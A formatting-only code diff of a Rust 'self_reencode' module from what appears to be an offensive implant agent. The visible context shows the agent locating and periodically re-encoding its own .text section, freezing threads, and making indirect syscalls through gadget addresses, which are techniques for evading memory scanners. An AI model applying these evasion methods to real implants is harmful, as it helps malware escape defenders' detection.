@@ -74,7 +74,9 @@ pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
     let seed = u64::from_le_bytes(hash[..8].try_into().expect("slice is 8 bytes"));
     // Ensure non-zero
     let seed = if seed == 0 { 1u64 } else { seed };
-    tracing::info!("self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng");
+    tracing::info!(
+        "self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng"
+    );
     seed
 }
 
@@ -170,8 +172,8 @@ pub fn find_text_section() -> Result<TextSection> {
 
 #[cfg(windows)]
 fn find_text_section_windows() -> Result<TextSection> {
-    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64};
-    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
+    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 
     // Resolve the agent's own module base.  The agent can be either the main
     // EXE or a DLL loaded into another process.  Read PEB.ImageBaseAddress
@@ -217,7 +219,8 @@ fn find_text_section_windows() -> Result<TextSection> {
             + nt.FileHeader.SizeOfOptionalHeader as usize;
 
         let sections = std::slice::from_raw_parts(
-            (base + section_table_offset) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER,
+            (base + section_table_offset)
+                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER,
             nt.FileHeader.NumberOfSections as usize,
         );
 
@@ -814,8 +817,8 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                             wait_sys.ssn,
                             wait_sys.gadget_addr,
                             &[
-                                handle as u64,            // Handle
-                                0u64,                     // Alertable = FALSE
+                                handle as u64,                       // Handle
+                                0u64,                                // Alertable = FALSE
                                 &timeout_100ns as *const i64 as u64, // Timeout (large integer)
                             ],
                         )
@@ -1034,9 +1037,7 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                         unverified_tids.push(tid);
                     }
                     Err(e) => {
-                        tracing::debug!(
-                            "self_reencode: cannot read status for tid={tid}: {e}"
-                        );
+                        tracing::debug!("self_reencode: cannot read status for tid={tid}: {e}");
                         unverified_tids.push(tid);
                     }
                 }
@@ -1067,12 +1068,7 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
             // Resume all threads we stopped and return an error.
             while let Some(tid) = tids.pop() {
                 let _ = unsafe {
-                    libc::syscall(
-                        libc::SYS_tgkill,
-                        pid,
-                        tid,
-                        libc::SIGCONT as libc::c_long,
-                    )
+                    libc::syscall(libc::SYS_tgkill, pid, tid, libc::SIGCONT as libc::c_long)
                 };
             }
             anyhow::bail!(
@@ -1081,7 +1077,10 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
             );
         }
 
-        tracing::debug!("self_reencode: all {} sibling threads confirmed stopped", tids.len());
+        tracing::debug!(
+            "self_reencode: all {} sibling threads confirmed stopped",
+            tids.len()
+        );
     }
 
     Ok(FrozenThreads {
@@ -1110,14 +1109,14 @@ const THREAD_BASIC_INFO: i32 = 3;
 #[cfg(target_os = "macos")]
 #[repr(C)]
 struct ThreadBasicInfo {
-    user_time:     u64, // time_value_t (2 × i32)
-    system_time:   u64, // time_value_t (2 × i32)
-    cpu_usage:     i32,
-    policy:        i32,
-    run_state:     i32,
-    flags:         i32,
+    user_time: u64,   // time_value_t (2 × i32)
+    system_time: u64, // time_value_t (2 × i32)
+    cpu_usage: i32,
+    policy: i32,
+    run_state: i32,
+    flags: i32,
     suspend_count: i32,
-    sleep_time:    i32,
+    sleep_time: i32,
 }
 
 #[cfg(target_os = "macos")]
@@ -1671,7 +1670,9 @@ pub fn spawn_periodic_reencode(
 
             let current = current_seed();
             let fresh_seed = derive_fresh_seed(current);
-            tracing::info!("self_reencode: periodic re-encode triggered with seed 0x{fresh_seed:016x}");
+            tracing::info!(
+                "self_reencode: periodic re-encode triggered with seed 0x{fresh_seed:016x}"
+            );
 
             match unsafe { reencode_text(fresh_seed) } {
                 Ok(()) => {
